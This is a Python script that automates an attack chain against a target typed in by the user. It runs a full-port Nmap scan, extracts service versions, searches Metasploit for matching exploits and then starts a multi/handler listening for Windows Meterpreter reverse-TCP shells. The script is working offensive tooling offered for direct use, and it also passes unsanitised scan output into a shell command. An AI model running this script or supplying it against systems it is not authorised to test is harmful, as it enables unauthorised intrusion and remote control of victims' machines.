import subprocess
import re

def run_nmap(target):
    print(f"Running detailed Nmap scan on {target}...")
    nmap_command = ["nmap", "-sS", "-sV", "-sC", "-p-", target]  # Version detection and default scripts
    result = subprocess.run(nmap_command, capture_output=True, text=True)

    if result.returncode == 0:
        print("Nmap scan completed successfully.")
        return result.stdout
    else:
        print("Nmap scan failed.")
        print(result.stderr)
        return None

def extract_open_ports(nmap_output):
    ports = {}
    port_pattern = re.compile(r"(\d{1,5})/tcp\s+open\s+(\S+)\s+(.+)")
    
    for line in nmap_output.splitlines():
        match = port_pattern.search(line)
        if match:
            port = match.group(1)
            service = match.group(2)
            version = match.group(3).strip() if match.group(3) else ""
            ports[port] = (service, version)
    
    return ports

def search_exploits(service, version):
    print(f"Searching for exploits for service: {service} with version: {version}...")
    
    search_query = f"{service}"
    if version:
        search_query += f" {version}"
    
    msf_command = f"msfconsole -q -x 'search type:exploit name:{search_query}; exit'"
    
    result = subprocess.run(msf_command, shell=True, capture_output=True, text=True, timeout=30)  # Add timeout
    
    if result.returncode == 0:
        print(f"Exploits found for {service}:")
        print(result.stdout)
    else:
        print(f"Failed to search exploits for {service}:")
        print(result.stderr)

def run_metasploit(target):
    print("Starting Metasploit...")
    msf_command = f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST your_local_ip; set LPORT your_port; run'"
    
    # Starting Metasploit in a new shell
    subprocess.Popen(msf_command, shell=True)
    print("Metasploit started. Waiting for connections...")

def main():
    target = input("Enter the target IP or hostname: ")
    
    # Step 1: Run Nmap
    nmap_output = run_nmap(target)
    
    if nmap_output:
        print("Nmap Output:")
        print(nmap_output)
        
        # Step 2: Extract open ports
        open_ports = extract_open_ports(nmap_output)
        
        # Step 3: Search for exploits for each service
        for port, (service, version) in open_ports.items():
            search_exploits(service, version)

        # Step 4: Run Metasploit
        run_metasploit(target)

if __name__ == "__main__":
    main()
